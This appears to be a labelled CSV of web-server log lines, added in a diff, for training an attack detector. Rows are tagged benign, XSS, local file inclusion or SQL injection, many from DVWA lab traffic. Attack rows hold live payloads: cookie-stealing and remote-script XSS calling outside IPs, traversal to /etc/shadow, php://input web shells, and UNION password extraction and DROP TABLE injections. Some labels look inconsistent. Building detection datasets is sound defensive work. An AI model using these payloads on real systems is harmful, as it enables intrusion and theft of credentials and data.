@@ -1,0 +1,208 @@
+Logs,Attack,
+"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 209",Benign,0
+"GET /dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E HTTP/1.1"" [-] 200 1474",Benign,0
+GET /?file=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F123.64.179.106%2F575002.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 5707 ,XSS,1
+"GET ../../../../apache/logs/access.log HTTP/1.1"" 200 3096",Local File Inclusion,2
+"GET /vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
+"GET ../../../../apache/logs/error.log HTTP/1.1"" 200 2382",Local File Inclusion,2
+"GET /dvwa/css/main.css HTTP/1.1"" [-] 304 0",Benign,0
+"GET ../../../../etc/shadow HTTP/1.1"" 200 3982",Local File Inclusion,2
+GET /dvwa/vulnerabilities/sqli/?id=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA%2eCHARACTER_SETS%20GROUP%20BY%20x%29a%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
+"GET /index.php HTTP/1.1"" [-] 200 2713 ""http://192.168.200.128/login.php",Benign,0
+"GET /dvwa/dvwa/images/lock.png HTTP/1.1"" [-] 304 0",Benign,0
+"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0",Benign,0
+"GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 1829",Local File Inclusion,2
+"GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 2834",Local File Inclusion,2
+"GET /dvwa/ HTTP/1.1"" [-] 302 5",Benign,0
+"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 200 4026 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1"" [-] 200 1628",Local File Inclusion,2
+"POST /login.php HTTP/1.1"" [username=admin&password=password&Login=Login&user_token=b05b5f987d93f9447f5525a9c2c528f6] 302 5",Benign,0
+"GET /dvwa/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd HTTP/1.1"" [-] 200 1630 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=include.php",Local File Inclusion,2
+"GET /dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0",Benign,0
+"GET / HTTP/1.1"" [-] 403 152",Benign,0
+"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0",Benign,0
+GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
+"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=javascript%3Aalert%281%29",Benign,0
+"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0",Benign,0
+"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=javascript%3Aalert%281%29",Benign,0
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [-] 200 53",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53",Local File Inclusion,2
+"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 200 1030 ""http://192.168.180.128/dvwa/index.php",Benign,0
+"GET /dvwa HTTP/1.1"" [-] 301 194 ""-",Benign,0
+"GET /dvwa/dvwa/images/login_logo.png HTTP/1.1"" [-] 200 9088 ""http://192.168.180.128/dvwa/login.php",Benign,0
+"GET /dvwa/index.php HTTP/1.1"" [-] 200 2716 ""http://192.168.180.128/dvwa/login.php",Benign,0
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>] 200 53",Local File Inclusion,2
+GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,SQL Injection,3
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>] 200 53",Local File Inclusion,2
+"GET /dvwa/login.php HTTP/1.1"" [-] 200 684",Benign,0
+"GET //dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.200.128/vulnerabilities/exec/",Benign,0
+"GET /dvwa/images/logo.png HTTP/1.1"" [-] 304 0 ""http://192.168.200.128/index.php",Benign,0
+"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/login.php",Benign,0
+"POST /dvwa/login.php HTTP/1.1"" [username=admin&password=password&Login=Login&user_token=82cd68d7a0ff7418275ac0d9af67f899] 302 5 ""http://192.168.180.128/dvwa/login.php",Benign,0
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1"" [<?php echo passthru(base64_decode($_GET['cmd']));?>\x0D\x0A] 200 1630",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1"" [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630",Local File Inclusion,2
+"GET /favicon.ico HTTP/1.1"" [-] 404 152 ""http://192.168.180.128/",Benign,0
+"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 200 4026 ""http://192.168.180.128/dvwa/index.php",Benign,0
+"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 200 842 ""http://192.168.180.128/dvwa/login.php",Benign,0
+GET /dvwa/vulnerabilities/sqli/?id=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2C%60user%60%2Cavatar%2Cfailed_login%2Cfirst_name%2Clast_login%2Clast_name%2Cpassword%2Cuser_id%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.users--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
+"GET /favicon.ico HTTP/1.1"" [-] 404 152 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd",Local File Inclusion,2
+"GET get.php?file=../../../../apache/logs/access.log HTTP/1.1"" 200 2577",Local File Inclusion,2
+"GET get.php?file=../../../../apache/logs/error.log HTTP/1.1"" 200 3774",Local File Inclusion,2
+"GET get.php?file=../../../../etc/passwd HTTP/1.1"" 200 6062",Local File Inclusion,2
+"GET get-files?file=../../../../apache/logs/access.log HTTP/1.1"" 200 7538",Local File Inclusion,2
+"GET get-files?file=../../../../etc/passwd HTTP/1.1"" 200 1264",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x6775657374626f6f6b%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1,SQL Injection,3
+GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1175 ,XSS,1
+GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 2244 ,XSS,1
+GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F119.28.107.63%2F430999%27%293C%2Fscript%3E HTTP/1.1  200 4720 ,XSS,1
+GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F132.144.70.196%2F536457%27%293C%2Fscript%3E HTTP/1.1  200 2570 ,XSS,1
+GET /?file=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F104.232.239.10%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 7536 ,XSS,1
+"GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1"" 200 2634",Local File Inclusion,2
+"GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1"" 200 4714",Local File Inclusion,2
+"GET main.cgi?file=../../../../etc/shadow HTTP/1.1"" 200 2086",Local File Inclusion,2
+"GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 6032",Local File Inclusion,2
+"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=null] 200 146",Local File Inclusion,2
+"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=null] 200 146",Local File Inclusion,2
+"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=whoami&cwd=null] 200 84",Local File Inclusion,2
+"POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 124",Local File Inclusion,2
+"POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1"" [cmd=whoami&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 84",Local File Inclusion,2
+"GET / HTTP/1.1"" [-] 403 208",Benign,0
+"GET /favicon.ico HTTP/1.1"" [-] 404 209",Benign,0
+"GET /xvwa/ HTTP/1.1"" [-] 200 3382",Benign,0
+"GET /xvwa/img/xvwa-logo.png HTTP/1.1"" [-] 304 0",Benign,0
+"GET /xvwa/vulnerabilities/ssti/ HTTP/1.1"" [-] 200 3112",Benign,0
+"GET /dvwa/security.php HTTP/1.1"" [-] 200 2219",Benign,0
+"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 209",Benign,0
+"GET /dvwa/vulnerabilities/brute/ HTTP/1.1"" [-] 200 1475",Benign,0
+"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 200 593",Benign,0
+"GET /dvwa/vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
+"GET /dvwa/vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
+"GET / HTTP/1.1"" [-] 403 152",Benign,0
+"GET /favicon.ico HTTP/1.1"" [-] 404 152",Benign,0
+"GET /dvwa HTTP/1.1"" [-] 301 194",Benign,0
+"GET /dvwa/ HTTP/1.1"" [-] 302 5",Benign,0
+"GET /dvwa/login.php HTTP/1.1"" [-] 200 684",Benign,0
+"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 200 842",Benign,0
+"GET /dvwa/dvwa/images/login_logo.png HTTP/1.1"" [-] 200 9088",Benign,0
+"GET /dvwa/setup.php HTTP/1.1"" [-] 200 2085",Benign,0
+"GET /dvwa/dvwa/images/spanner.png HTTP/1.1"" [-] 200 464",Benign,0
+"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 152",Benign,0
+"GET /dvwa/security.php HTTP/1.1"" [-] 200 2202",Benign,0
+"GET /dvwa/dvwa/images/lock.png HTTP/1.1"" [-] 200 761",Benign,0
+"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 152",Benign,0
+GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F145.190.136.169%22%3C%2Fscript%3E HTTP/1.1  200 1297 ,XSS,1
+GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F183.250.61.150%22%3C%2Fscript%3E HTTP/1.1  200 3886 ,XSS,1
+GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F124.25.127.129%2F898879.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 4972 ,XSS,1
+"GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F141.19.75.249%2F869455.js%3D%3E%3C%2Fscript%3E HTTP/1.1"" 200 4879",XSS,1
+GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 3288 ,XSS,1
+GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 3982 ,XSS,1
+GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F181.217.202.255%2F488204%27%293C%2Fscript%3E HTTP/1.1  200 1285 ,XSS,1
+GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F4.8.29.8%2F894133%27%293C%2Fscript%3E HTTP/1.1  200 7337 ,XSS,1
+GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F136.108.230.32%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 2624 ,XSS,1
+GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F156.136.208.75%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 5807 ,XSS,1
+GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F0.156.130.88%22%3C%2Fscript%3E HTTP/1.1  200 4228 ,XSS,1
+GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F110.108.96.122%22%3C%2Fscript%3E HTTP/1.1  200 4935 ,XSS,1
+GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F111.115.213.48%2F804199.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 7000 ,XSS,1
+GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F164.235.246.70%2F796213.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 2687 ,XSS,1
+GET /?p=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 4343 ,XSS,1
+GET /?p=%3Cscript%3E%window.open%28%27http%3A%2F%2F172.68.135.129%2F47198%27%293C%2Fscript%3E HTTP/1.1  200 2330 ,XSS,1
+GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F153.131.117.236%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 1732 ,XSS,1
+GET /?p=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F100.183.88.107%22%3C%2Fscript%3E HTTP/1.1  200 2158 ,XSS,1
+GET /?search=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F107.238.201.227%2F763569.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 5551 ,XSS,1
+GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1472 ,XSS,1
+GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1604 ,XSS,1
+GET /?search=%3Cscript%3E%window.open%28%27http%3A%2F%2F143.46.228.198%2F106135%27%293C%2Fscript%3E HTTP/1.1  200 7076 ,XSS,1
+GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F114.61.64.247%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 6421 ,XSS,1
+GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F12.66.35.241%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 6644 ,XSS,1
+GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F12.80.50.136%22%3C%2Fscript%3E HTTP/1.1  200 3879 ,XSS,1
+GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F152.4.200.33%22%3C%2Fscript%3E HTTP/1.1  200 6953 ,XSS,1
+"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
+"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 304 0",XSS,1
+"GET /dvwa/dvwa/images/logo.png HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
+"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1"" [-] 200 1593 ""http://192.168.154.128/dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1"" [-] 200 1593 ""http://192.168.154.128/dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cbody%20onload=alert(1)%3E HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"" [-] 200 1590",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"" [-] 302 5",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1"" [-] 200 1593",XSS,1
+"GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1"" [-] 200 1477 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
+"GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1"" [-] 200 1480 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3C%3E",XSS,1
+"GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E HTTP/1.1"" [-] 200 1470",XSS,1
+"GET /dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E HTTP/1.1"" [-] 200 1488 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me",XSS,1
+"GET /dvwa/vulnerabilities/xss_r/?name=script HTTP/1.1"" [-] 200 1465 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E",XSS,1
+"POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1"" [txtName=a&mtxMessage=onmouseover%3D%22alert%281%29%22&btnSign=Sign+Guestbook] 200 1763",XSS,1
+"POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1"" [txtName=test&mtxMessage=%3Conmouseover%3D%22alert%281%29%22%3E&btnSign=Sign+Guestbook] 200 1774",XSS,1
+"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccomment%2Ccomment_id%2Cname%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.guestbook--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ctable_name%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x64767761%29--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=1%27+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ,SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit",SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1  200 1889,SQL Injection,3
+GET login/?id=%27+or+1=1%23 HTTP/1.1  200 1568 ,SQL Injection,3
+GET login/?id=%27+or+1=1%23 HTTP/1.1  200 1662 ,SQL Injection,3
+GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1  200 1117 ,SQL Injection,3
+GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1  200 1229 ,SQL Injection,3
+GET login/?id=admin%27+-- HTTP/1.1  200 1048 ,SQL Injection,3
+GET login/?id=admin%27+-- HTTP/1.1  200 1139 ,SQL Injection,3
+GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 1211 ,SQL Injection,3
+GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 1302 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=%22%20or%20%22%22%2A%22&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=%20WHERE%201%3D1%20AND%201%3D1%23&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1672 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20GROUP%20BY%201%2C2%2C--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%202--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
+GET /dvwa/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
+GET /products.php?categoryid=1%20OR%201=1;-- HTTP/1.1  200 1432,SQL Injection,3
+GET /search.php?search_query=%27;DROP%20TABLE%20users;-- HTTP/1.1  500 1432,SQL Injection,3
+"GET /profile.php?id=1234%20UNION%20SELECT%20username,password%20FROM%20users;-- HTTP/1.1  200 1203",SQL Injection,3
+GET /articles.php?id=1%20OR%20SLEEP(10);-- HTTP/1.1  200 1203,SQL Injection,3
+GET /search.php?q=foo%27;DROP%20TABLE%20users;%20-- HTTP/1.1   200 1123,SQL Injection,3
+"GET /search.php?q=foo%27%3B%20SELECT%20*%20FROM%20users%3B%20-- HTTP/1.1"" 200 1123",SQL Injection,3
+"GET /usr/login HTTP/1.1"" 502 4950",Benign,0
+"POST /usr/admin/developer HTTP/1.1"" 502 4955",Benign,0
+"GET /usr/admin/developer HTTP/1.1"" 303 5005",Benign,0
+"POST /usr/login HTTP/1.1"" 403 4995",Benign,0
+"PUT /usr/register HTTP/1.1"" 200 4980",Benign,0
+"GET /usr/register HTTP/1.1"" 404 4989",Benign,0
+"GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1"" 200 2451",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php HTTP/1.1"" 200 1586",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1657 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1"" 200 1024 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/flags/",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low&locale=en HTTP/1.1"" 200 1997 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi?page=http://www.evilsite.com/evil.php HTTP/1.1"" 301 678",Local File Inclusion,2
+"GET /dvwa/dvwa/css/source.css HTTP/1.1"" 200 533 ""http://127.0.0.1/dvwa/vulnerabilities/view_source.php?id=fi&security=low",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1"" 200 1375",Local File Inclusion,2
+"GET /dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit HTTP/1.1"" 200 1667",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1234+SQL%40%40version&Submit=Submit HTTP/1.1"" 200 1667 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1"" 200 1888",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
